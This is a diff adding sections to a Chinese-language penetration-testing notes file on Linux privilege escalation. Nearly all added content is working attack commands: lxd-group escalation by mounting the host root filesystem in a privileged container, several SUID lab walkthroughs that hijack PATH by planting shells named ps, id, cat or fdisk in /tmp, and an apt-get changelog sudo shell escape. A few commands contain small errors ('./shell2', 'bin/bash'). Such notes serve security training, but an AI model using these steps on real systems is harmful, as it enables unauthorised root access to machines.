@@ -244,6 +244,156 @@
 		-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；
 		
 	- 也可以在宿主机/etc/passwd中添加特权用户
+- lxd用户组提权
+	::
+	
+		git clone  https://github.com/saghul/lxd-alpine-builder.git
+		cd lxd-alpine-builder
+		./build-alpine
+		编译一个容器，然后放在服务器
+		目标机器上执行wget下载到本地，并执行以下命令
+		lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+		lxc init myimage ignite -c security.privileged=true
+		lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+		lxc start ignite
+		lxc exec ignite /bin/sh
+		id
+		
+- Linux Privilege Escalation Using PATH Variable
+	- $PATH
+		::
+		
+			echo $PATH
+			/usr/gnu/bin:/usr/local/bin:/bin:/usr/bin:.
+			If you notice ‘.’ in environment PATH variable it means that the logged user can execute 
+			binaries/scripts from the current directory and it can be an excellent technique for an 
+			attacker to escalate root privilege.
+			
+	- Ubuntu LAB SET_UP
+		::
+		
+			mkdir script
+			cd script
+			nano demo.c
+				#include<unistd.h>
+				void main()
+				{
+					setuid(0);
+					setgid(0);
+					system("ps");
+				}
+			gcc demo.c -o shell
+			chmod u+s shell
+			find / -perm -u=s -type f 2>/dev/null
+			方法一：
+			cd /tmp
+			echo "/bin/bash" > ps
+			chmod 777 ps
+			echo $PATH
+			export PATH=/tmp:$PATH
+			cd /script
+			./shell
+			方法二：
+			cd /script/
+			cp /bin/sh /tmp/ps
+			echo $PATH
+			export PATH=/tmp:$PATH
+			./shell
+			方法三：
+			ln -s /bin/sh ps
+			export PATH=.:$PATH
+			./shell
+			
+	- Ubuntu LAB SET_UP
+		::
+		
+			mkdir script
+			cd script
+			nano demo.c
+				#include<unistd.h>
+				void main()
+				{
+					setuid(0);
+					setgid(0);
+					system("id");
+				}
+			gcc demo.c -o shell
+			chmod u+s shell
+			find / -perm -u=s -type f 2>/dev/null
+			cd /tmp
+			echo "/bin/bash" > id
+			chmod 777 id
+			echo $PATH
+			export PATH=/tmp:$PATH
+			cd /script
+			./shell2
+			whoami
+			
+	- Ubuntu LAB SET_UP
+		::
+		
+			mkdir script
+			cd script
+			nano demo.c
+				#include<unistd.h>
+				void main()
+				{
+					setuid(0);
+					setgid(0);
+					system("cat /etc/passwd");
+				}
+			gcc demo.c -o shell
+			chmod u+s shell
+			find / -perm -u=s -type f 2>/dev/null
+			cd /tmp
+			nano cat
+				/bin/bash
+			chmod 777 cat
+			echo $PATH
+			export PATH=/tmp:$PATH
+			cd /script
+			./shell
+			
+	- Ubuntu LAB SET_UP
+		::
+		
+			mkdir script
+			cd script
+			nano demo.c
+				#include<unistd.h>
+				void main()
+				{
+					setuid(0);
+					setgid(0);
+					system("cat msg.txt");
+				}
+			gcc demo.c -o shell
+			chmod u+s shell
+			find / -perm -u=s -type f 2>/dev/null
+			cd /tmp
+			vi cat
+				/bin/bash
+			chmod 777 cat
+			echo $PATH
+			export PATH=/tmp:$PATH
+			cd /script
+			./shell
+	- 示例
+		::
+		
+			find / -perm -u=s -type f 2>/dev/null
+			发现/usr/bin/healthcheck
+			运行string /usr/bin/healthcheck
+			发现运行了命令‘ifconfig‘ and ‘ fdisk ‘
+			cd /tmp
+			echo "bin/bash" > fdisk
+			chmod 777 fdisk
+			export PATH=/tmp:$PATH
+			/usr/bin/healthcheck
+			cd /root
+			ls
+			
+			
 - 第三方组件提权
 	- chkrootkit(<=0.49)
 		- msf:unix/local/chkrootkit
@@ -310,6 +460,12 @@
 			
 			#Get the shell! (Pass : Password@973)
 			su Tom
+	- apt-get
+		::
+		
+			前提sudo免密执行权限
+			sudo apt-get changelog apt
+			!/bin/sh
 			
 			
 持久化
